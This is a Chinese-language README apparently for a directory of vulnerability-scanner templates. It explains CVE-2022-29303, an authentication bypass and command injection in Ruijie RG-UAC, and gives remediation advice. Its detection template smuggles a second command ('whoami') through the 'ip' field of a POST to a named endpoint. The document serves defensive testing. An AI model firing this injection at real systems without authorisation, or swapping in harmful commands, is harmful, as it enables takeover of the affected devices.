# 其他产品平台安全模板分类说明

本目录聚焦于各类非主流或行业专用平台的安全风险，涵盖远程代码执行、未授权访问、信息泄露等典型漏洞，帮助安全测试人员快速定位和验证相关风险。

---

## 典型漏洞模板举例

### Ruijie RG-UAC 认证绕过与远程命令执行漏洞（CVE-2022-29303）

**模板文件**：`CVE-2022-29303.yaml`

#### 漏洞简介

锐捷 RG-UAC 统一上网行为管理审计系统存在认证绕过与远程命令执行漏洞。攻击者可通过特定接口绕过认证限制，进而在目标系统上执行任意命令，获取系统权限。

#### 漏洞原理

该漏洞源于 Web 接口对用户身份校验不严，攻击者可直接访问敏感接口并传入恶意参数，服务端未做有效权限校验即执行命令，导致系统被完全控制。

#### 检测逻辑（YAML内容解析）

```yaml
id: CVE-2022-29303

http:
  - method: POST
    path:
      - "/guest_auth/guestIsUp.php"
    body: "ip=127.0.0.1|whoami"
    matchers:
      - type: word
        part: body
        words:
          - "root"
          - "admin"
```

- 发送包含命令注入的 POST 请求到 `/guest_auth/guestIsUp.php` 接口。
- 若响应体中出现系统用户名（如 root、admin），则判定存在命令执行漏洞。

#### 防护建议

- 升级锐捷 RG-UAC 至官方修复版本。
- 对敏感接口添加严格的认证和权限校验。
- 对用户输入进行严格校验，避免命令注入。

---